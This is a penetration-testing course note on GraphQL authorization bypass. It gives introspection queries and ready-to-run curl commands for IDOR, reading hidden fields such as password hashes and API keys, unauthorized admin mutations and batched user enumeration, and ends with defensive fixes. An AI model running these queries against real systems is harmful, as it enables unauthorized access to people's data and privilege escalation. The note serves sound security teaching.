---
tags: [vapt, access-control, graphql, intermediate]
difficulty: intermediate
module: "21 - Access Control"
topic: "21.16 GraphQL Authorization Bypass"
---

# 21.16 — GraphQL Authorization Bypass

## GraphQL and Access Control

```
GRAPHQL IS DIFFERENT FROM REST:
  REST: /api/users/42 → returns user 42
  GraphQL: Single endpoint /graphql → query specifies what you want
  
  {
    user(id: 42) {
      name
      email
      role
      orders {
        id
        amount
      }
    }
  }
  
  ACCESS CONTROL CHALLENGE:
  With REST: you protect specific endpoints (/admin/users → require admin)
  With GraphQL: ONE endpoint → query determines what's fetched
  
  EACH FIELD AND TYPE needs separate authorization!
  Developers often forget individual field-level authorization
  
  COMMON MISTAKE:
  "We protect the /graphql endpoint with auth"
  But: authenticated users can query each other's data, admin fields, etc.!
```

---

## Introspection — First Step in GraphQL Recon

```
INTROSPECTION:
  GraphQL has built-in self-documentation!
  Query: { __schema { types { name fields { name } } } }
  → Returns ALL types, fields, queries, mutations!
  
  QUICK INTROSPECTION CHECK:
  POST /graphql
  Content-Type: application/json
  {
    "query": "{ __schema { queryType { name } } }"
  }
  → Success? → Introspection enabled!
  
  FULL SCHEMA DUMP:
  # Use graphql-cop or InQL:
  
  # graphql-cop (check security):
  python3 graphql-cop.py -t https://target.com/graphql
  
  # InQL (Burp extension or standalone):
  inql -t https://target.com/graphql --generate-cycles
  # → Generates all possible queries from schema!
  
  # Manual full introspection:
  {
    __schema {
      types {
        name
        kind
        fields {
          name
          type { name kind }
          args { name type { name } }
        }
      }
    }
  }
```

---

## Authorization Bypass Attack Patterns

### Pattern 1: IDOR via ID Argument

```graphql
# Your query (authorized):
{
  user(id: "42") {
    name
    email
    orders { id amount }
  }
}

# IDOR attempt (change ID):
{
  user(id: "1") {     ← admin user?
    name
    email
    role
    password_hash
  }
}

# → If server doesn't check ownership → returns admin's data!
```

### Pattern 2: Accessing Hidden Fields

```graphql
# Normal UI query (safe fields shown):
{
  currentUser {
    name
    email
  }
}

# But schema has more fields — try querying them:
{
  currentUser {
    name
    email
    password_hash      ← sensitive!
    api_key            ← sensitive!
    internal_notes     ← private!
    credit_card_number ← PCI data!
    role               ← privilege info!
  }
}

# → If server returns these fields to any authenticated user → exposure!
```

### Pattern 3: Unauthorized Mutation

```graphql
# Regular user tries admin mutation:
mutation {
  deleteUser(id: "43") {
    success
  }
}

# → Admin-only operation executed by regular user → BFLA via GraphQL!

mutation {
  makeUserAdmin(id: "42") {   ← making yourself admin!
    role
  }
}
```

### Pattern 4: Nested Object Access

```graphql
# Company employee can query their own company:
{
  company(id: "MY_COMPANY") {
    employees {
      name
      email
      salary      ← might be restricted to HR only!
    }
  }
}

# But what about OTHER companies?
{
  company(id: "OTHER_COMPANY") {
    employees { name email salary }
  }
}

# Or nested through other objects:
{
  user(id: "42") {
    company {       ← might expose other company!
      employees { name email }
    }
  }
}
```

---

## Testing GraphQL Authorization

```bash
# STEP 1: CHECK IF INTROSPECTION IS ENABLED:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "{ __schema { queryType { name } } }"}' | python3 -m json.tool

# STEP 2: DUMP FULL SCHEMA (if introspection enabled):
# Using InQL:
pip install inql
inql -t https://target.com/graphql -H "Authorization: Bearer TOKEN"
# → Generates .html with all queries and mutations

# STEP 3: TRY QUERYING OTHER USERS' IDS:
# From introspection, find user query
# Try different IDs:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -d '{"query": "{ user(id: \"1\") { name email role password_hash api_key } }"}' \
  | python3 -m json.tool

# STEP 4: TRY ALL FIELDS ON YOUR OWN ACCOUNT:
# Some sensitive fields might be there but not shown in UI:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "{ me { id name email role isAdmin apiKey passwordHash internalNotes } }"}' \
  | python3 -m json.tool

# STEP 5: TRY ADMIN MUTATIONS:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -d '{"query": "mutation { deleteUser(id: \"43\") { success } }"}' \
  | python3 -m json.tool

# STEP 6: BATCH QUERIES (bypass rate limiting):
# GraphQL allows multiple queries in one request:
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: \"1\") { email } }"},
    {"query": "{ user(id: \"2\") { email } }"},
    {"query": "{ user(id: \"3\") { email } }"}
  ]'
# → Batch 100 queries → enumerate users quickly!
```

---

## Fix

```
GRAPHQL SECURITY BEST PRACTICES:

1. FIELD-LEVEL AUTHORIZATION:
   # Each resolver must check permissions:
   
   # JavaScript GraphQL:
   const resolvers = {
     Query: {
       user: async (_, { id }, context) => {
         const requestingUser = context.user;
         if (!requestingUser) throw new Error('Unauthorized');
         
         // Can only see own profile unless admin:
         if (id !== requestingUser.id && !requestingUser.isAdmin) {
           throw new Error('Forbidden');
         }
         
         return db.getUser(id);
       }
     },
     User: {
       // Sensitive field resolver:
       passwordHash: (parent, _, context) => {
         if (!context.user?.isAdmin) return null;  // null → not returned!
         return parent.passwordHash;
       },
       apiKey: (parent, _, context) => {
         if (parent.id !== context.user?.id) return null;  // own key only
         return parent.apiKey;
       }
     }
   };

2. DISABLE INTROSPECTION IN PRODUCTION:
   # Prevents schema enumeration:
   const server = new ApolloServer({
     introspection: process.env.NODE_ENV !== 'production',
   });

3. QUERY DEPTH LIMITING:
   # Prevent deeply nested queries that expose nested data:
   import depthLimit from 'graphql-depth-limit';
   app.use('/graphql', graphqlHTTP({
     validationRules: [depthLimit(5)]
   }));

4. QUERY COMPLEXITY LIMITING:
   # Prevent expensive queries / enumeration:
   import queryComplexity from 'graphql-query-complexity';
   # Limits total complexity score per query

5. DISABLE BATCHING OR RATE LIMIT IT:
   # If batching enabled → rate limit per batch
   # Or disable entirely if not needed

6. USE AUTHORIZATION LIBRARIES:
   graphql-shield: permission rules per field
   graphql-authz: declarative authorization
```

---

## Related Notes
- [[09 - BOLA — Broken Object Level Authorization (OWASP API #1)]] — BOLA
- [[10 - BFLA — Broken Function Level Authorization (OWASP API #5)]] — function auth
- [[08 - Mass Assignment Vulnerability]] — similar unconstrained field access
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
